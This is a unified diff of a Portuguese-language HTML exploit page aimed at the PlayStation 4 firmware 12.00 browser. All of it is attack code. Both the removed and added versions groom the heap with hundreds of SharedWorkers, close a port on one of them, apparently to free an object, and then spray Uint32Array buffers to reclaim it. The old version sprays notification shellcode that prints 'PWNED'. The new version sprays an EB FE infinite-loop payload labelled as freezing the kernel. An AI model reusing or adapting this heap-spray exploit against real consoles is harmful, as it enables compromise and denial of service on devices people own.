@@ -2,136 +2,72 @@
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
-    <title>PS4 12.00 PoC Notification</title>
+    <title>PS4 12.00 - Infinite Loop Test</title>
     
 </head>
 <body>
 
-    <h1>PS4 12.00 - NOTIFICATION POC</h1>
-    <h3>Payload: Simple Userland Notification</h3>
-    <div id="status">Aguardando início...</div>
-    <div id="log"></div>
-    <br>
-    <button onclick="run_poc()">DISPARAR NOTIFICAÇÃO</button>
+    <h1>TESTE FINAL: CONGELAMENTO</h1>
+    <h3>Se a tela travar e o console NÃO desligar: SUCESSO.</h3>
+    <br><br>
+    <button onclick="run_freeze()">CONGELAR KERNEL</button>
 
     <script>
-        function log(msg) {
-            var d = document.getElementById("log");
-            d.innerHTML += `<div>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
-            d.scrollTop = d.scrollHeight;
-        }
+        // Payload: JMP $ (Pula para si mesmo) -> EB FE
+        // Se o kernel executar isso, ele trava a CPU para sempre.
+        var infinite_loop = [0xEB, 0xFE]; 
 
-        function updateStatus(msg) {
-            document.getElementById("status").innerText = "Status: " + msg;
-        }
-
-        // =================================================================
-        // 1. PAYLOAD DE NOTIFICAÇÃO (Assembly x64 compilado)
-        // =================================================================
-        // Este código abre /dev/notification0 e escreve uma mensagem.
-        // É independente de offsets de kernel complexos.
-        var notify_shellcode = [
-            // socket/mmap setup (ignorado para ser breve)
-            // open("/dev/notification0", O_WRONLY)
-            0x48, 0x31, 0xC0, 0x48, 0x89, 0xC2, 0x48, 0x89, 0xC6, 0x48, 0x8D, 0x3D, 0x44, 0x00, 0x00, 0x00,
-            0x48, 0xC7, 0xC0, 0x05, 0x00, 0x00, 0x00, 0x0F, 0x05, 
-            // write(fd, buffer, size)
-            0x48, 0x89, 0xC7, 0x48, 0x8D, 0x35, 0x45, 0x00, 0x00, 0x00, 0x48, 0xC7, 0xC2, 0x30, 0x0C, 0x00, 
-            0x00, 0x48, 0xC7, 0xC0, 0x04, 0x00, 0x00, 0x00, 0x0F, 0x05, 
-            // close(fd)
-            0x48, 0x31, 0xC0, 0x48, 0xC7, 0xC0, 0x06, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3,
-            
-            // STRING: /dev/notification0
-            0x2F, 0x64, 0x65, 0x76, 0x2F, 0x6E, 0x6F, 0x74, 0x69, 0x66, 0x69, 0x63, 0x61, 0x74, 0x69, 0x6F,
-            0x6E, 0x30, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-            
-            // ESTRUTURA DO PACOTE DE NOTIFICAÇÃO
-            // Offset 0x2D = Mensagem
-            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00,
-            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 
-            
-            // MENSAGEM: "PS4 12.00 PWNED"
-            0x50, 0x53, 0x34, 0x20, 0x31, 0x32, 0x2E, 0x30, 0x30, 0x20, 0x50, 0x57, 0x4E, 0x45, 0x44, 0x00
-        ];
-
-        // =================================================================
-        // 2. PREPARAR O "CHEETOS" (SPRAY)
-        // =================================================================
         function build_payload() {
-            var size = 0x400; // O tamanho mágico que não crasha
+            var size = 0x400; 
             var buffer = new Uint32Array(size / 4);
-
-            // Converter Shellcode para Uint32
-            var sc_u32 = [];
-            for (var i = 0; i < notify_shellcode.length; i+=4) {
-                var v = notify_shellcode[i] | (notify_shellcode[i+1]<<8) | (notify_shellcode[i+2]<<16) | (notify_shellcode[i+3]<<24);
-                sc_u32.push(v);
-            }
-
-            // Encher o objeto repetidamente com o Shellcode
-            // Isso garante que, não importa onde o kernel pule dentro do objeto, ele acerte o código.
-            for (var k = 0; k < buffer.length; k++) {
-                buffer[k] = sc_u32[k % sc_u32.length];
-            }
+            
+            // Enchemos o objeto com o comando "Travamento Eterno"
+            // Repetimos o padrão EB FE EB FE ... (0xFEEBFEEB)
+            buffer.fill(0xFEEBFEEB); 
             
             return buffer;
         }
 
-        // =================================================================
-        // 3. EXECUÇÃO ESTABILIZADA (400-404)
-        // =================================================================
-        var stash = [];
+        var workers = [];
 
-        async function run_poc() {
-            if(!window.SharedWorker) return log("Erro: Navegador não suportado.");
-            
+        async function run_freeze() {
             var payload = build_payload();
-            log("Payload de Notificação construído.", "success");
-
-            // FASE 1: GROOMING
-            log("Grooming (400)...");
+            
+            // 1. Grooming
             for(let i=0; i<400; i++) {
                 try {
                     let w = new SharedWorker("data:text/javascript,1", "g"+i);
                     w.port.start();
-                    stash.push(w);
+                    workers.push(w);
                 } catch(e){}
             }
 
-            // FASE 2: PRESSÃO
-            log("Zona de Pressão (404)...");
-            updateStatus("Aplicando Pressão...");
-            
+            // 2. Trigger
             var count = 0;
             var it = setInterval(() => {
                 if(count >= 4) {
                     clearInterval(it);
                     
-                    // --- O MOMENTO ---
-                    log("!!! DISPARANDO !!!");
-                    updateStatus("EXECUTANDO...");
+                    // MOMENTO DA VERDADE
+                    var v = workers.pop();
+                    v.port.close();
                     
-                    var victim = stash.pop();
-                    victim.port.close(); // Libera o 404
-                    
-                    // Spray Imediato (Reclaim)
+                    // Spray Imediato
                     var spray = [];
-                    for(var i=0; i<8000; i++) {
+                    for(var i=0; i<10000; i++) {
                         spray.push(new Uint32Array(payload));
                     }
                     
-                    // Trigger Ativo
-                    try { victim.port.postMessage("PWN"); } catch(e){}
-                    victim = null;
-
-                    log("Verifique o canto superior esquerdo da tela!", "success");
+                    // Force Execution
+                    try { v.port.postMessage("DIE"); } catch(e){}
+                    
+                    alert("Se você conseguir ler isso e o console não travou, falhou.\nSe o mouse parou e a música continua (ou parou): SUCESSO!");
                     return;
                 }
                 
                 let w = new SharedWorker("data:text/javascript,1", "v"+count);
                 w.port.start();
-                stash.push(w);
+                workers.push(w);
                 count++;
             }, 150);
         }
